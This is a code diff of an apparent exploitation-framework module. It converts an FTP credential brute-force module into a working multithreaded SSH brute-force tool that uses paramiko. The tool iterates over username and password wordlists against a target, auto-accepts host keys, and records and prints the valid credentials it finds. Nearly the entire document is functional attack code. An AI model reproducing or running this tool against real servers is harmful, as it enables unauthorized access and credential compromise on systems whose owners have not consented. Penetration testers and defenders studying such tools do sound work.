@@ -1,23 +1,22 @@
-import ftplib
+import threading
 import itertools
 import socket
-import threading
+import paramiko
 
 import Wordlists
 from Base.Exploits import Exploit, Option
-from Utils import multi, print_error, print_success, print_status, print_table, LockedIterator, boolify
+from Utils import multi, print_error, print_success, print_status, print_table, boolify, LockedIterator
 
 
 class Exploit(Exploit):
     """
-    Module performs bruteforce attack against FTP service.
+    Module performs bruteforce attack against SSH service.
     If valid credentials are found, they are displayed to the user.
     """
-
     __info__ = {
-        'name': 'credentials/ftp/bruteforce',
-        'display_name': 'FTP Credential Bruteforce',
-        'description': 'Module performs bruteforce attack against FTP service.'
+        'name': 'credentials/ssh/bruteforce',
+        'display_name': 'SSH Bruteforce',
+        'description': 'Module performs bruteforce attack against SSH service. '
                        'If valid credentials are found, they are displayed to the user.',
         'authors': [
             'Marcin Bury <marcin.bury[at]reverse-shell.com>',
@@ -32,7 +31,7 @@ class Exploit(Exploit):
     }
 
     target = Option('', 'Target IP address or file with target:port (file://)')
-    port = Option(21, 'Target port')
+    port = Option(22, 'Target port')
 
     threads = Option(8, 'Number of threads')
     usernames = Option('admin', 'Username or file with usernames (file://)')
@@ -46,21 +45,20 @@ class Exploit(Exploit):
         self.credentials = []
         self.attack()
 
-    def check(self):
-        pass
-
     @multi
     def attack(self):
-        ftp = ftplib.FTP()
+        ssh = paramiko.SSHClient()
+
         try:
-            ftp.connect(self.target, port=int(self.port), timeout=10)
-        except (socket.error, socket.timeout):
+            ssh.connect(self.target, port=self.port)
+        except socket.error:
             print_error("Connection error: %s:%s" % (self.target, str(self.port)))
-            ftp.close()
+            ssh.close()
             return
         except:
             pass
-        ftp.close()
+
+        ssh.close()
 
         if self.usernames.startswith('file://'):
             usernames = open(self.usernames[7:], 'r')
@@ -73,7 +71,6 @@ class Exploit(Exploit):
             passwords = [self.passwords]
 
         collection = LockedIterator(itertools.product(usernames, passwords))
-
         self.run_threads(self.threads, self.target_function, collection)
 
         if len(self.credentials):
@@ -86,44 +83,29 @@ class Exploit(Exploit):
     def target_function(self, running, data):
         module_verbosity = boolify(self.verbosity)
         name = threading.current_thread().name
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-        print_status(name, 'process is starting...', verbose=module_verbosity)
+        print_status(name, 'thread is starting...', verbose=module_verbosity)
 
-        ftp = ftplib.FTP()
         while running.is_set():
             try:
                 user, password = data.next()
                 user = user.strip()
                 password = password.strip()
+                ssh.connect(self.target, int(self.port), timeout=5, username=user, password=password)
             except StopIteration:
                 break
+            except paramiko.ssh_exception.SSHException as err:
+                ssh.close()
+                print_error("Target: {}:{} {}: {} Username: '{}' Password: '{}'"
+                            .format(self.target, self.port, name, err, user, password), verbose=module_verbosity)
             else:
-                retries = 0
-                while retries < 3:
-                    try:
-                        ftp.connect(self.target, port=int(self.port), timeout=10)
-                        break
-                    except (socket.error, socket.timeout):
-                        print_error("{} Connection problem. Retrying...".format(name), verbose=module_verbosity)
-                        retries += 1
+                if boolify(self.stop_on_success):
+                    running.clear()
 
-                        if retries > 2:
-                            print_error("Too much connection problems. Quiting...", verbose=module_verbosity)
-                            return
+                print_success("Target: {}:{} {} Authentication Succeed - Username: '{}' Password: '{}'"
+                              .format(self.target, self.port, name, user, password), verbose=module_verbosity)
+                self.credentials.append((self.target, self.port, user, password))
 
-                try:
-                    ftp.login(user, password)
-
-                    if boolify(self.stop_on_success):
-                        running.clear()
-
-                    print_success("Target: {}:{} {}: Authentication succeed - Username: '{}' Password: '{}'"
-                                  .format(self.target, self.port, name, user, password), verbose=module_verbosity)
-                    self.credentials.append((self.target, self.port, user, password))
-                except:
-                    print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'"
-                                .format(self.target, self.port, name, user, password), verbose=module_verbosity)
-
-                ftp.close()
-
-        print_status(name, 'process is terminated.', verbose=module_verbosity)
+        print_status(name, 'thread is terminated.', verbose=module_verbosity)
